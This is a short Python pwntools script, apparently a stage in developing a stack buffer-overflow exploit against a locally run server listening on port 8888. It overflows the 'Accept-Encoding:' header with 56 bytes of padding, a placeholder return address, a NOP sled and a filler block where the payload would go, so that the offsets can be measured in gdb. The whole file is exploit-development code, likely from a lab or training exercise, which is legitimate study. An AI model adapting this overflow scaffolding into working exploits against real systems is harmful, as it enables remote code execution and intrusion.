# findAddress.py

"""
Script used to inject a recognizable pattern into the target binary
while using dgb
"""

from pwn import *

target_address = p64(0x424242424242)
# causeCrash.py revealed that the "Accept-Encoding:" field is vulnerable
target_field   = b"Accept-Encoding:"
padding        = b"A" * 56 # In gdb the buffer was discovered to be 56 bytes long
nopsled        = b"\x90" * 200 # Arbitrary number of nop x86 operations
# Used to measure how much space we have for the payload in a later script
code           = b"C" * 100

conn           = remote("127.0.0.1", 8888)
conn.send(target_field + padding + target_address + nopsled + code + b"\r\n")
